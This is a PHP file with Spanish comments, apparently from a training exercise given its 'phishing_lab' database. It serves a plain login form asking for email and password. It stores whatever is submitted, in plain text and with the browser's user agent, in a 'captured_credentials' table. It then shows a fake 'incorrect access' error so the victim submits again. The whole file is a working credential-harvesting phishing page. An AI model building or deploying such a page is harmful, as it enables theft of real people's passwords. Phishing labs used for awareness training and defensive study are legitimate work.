<?php
// Datos para conexión a base de datos en XAMPP (ajusta según tu XAMPP)
$db_host = "host.docker.internal";   // IP de XAMPP (puede ser otra si está en otra máquina)
$db_user = "root";
$db_pass = "";            // Contraseña por defecto de XAMPP
$db_name = "phishing_lab";

// Conexión a base de datos externa (XAMPP)
$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
if ($conn->connect_error) {
    die("Error al conectar con XAMPP DB: " . $conn->connect_error);
}

// Procesar el formulario
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"] ?? "";
    $password = $_POST["password"] ?? "";
    $useragent = $_SERVER["HTTP_USER_AGENT"];

    $stmt = $conn->prepare("INSERT INTO captured_credentials (email, password, useragent) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $email, $password, $useragent);

    if ($stmt->execute()) {
        echo "<p>Acceso incorrecto. Intenta nuevamente.</p>";
    } else {
        echo "<p>Error al registrar intento.</p>";
    }

    $stmt->close();
}

$conn->close();
?>

<!DOCTYPE html>
<html>
<head>
    <title>Acceso al sistema</title>
</head>
<body>
    <h2>Iniciar sesión</h2>
    <form method="POST">
        <label>Email:</label><br>
        <input type="email" name="email" required><br><br>

        <label>Contraseña:</label><br>
        <input type="password" name="password" required><br><br>

        <button type="submit">Entrar</button>
    </form>
</body>
</html>
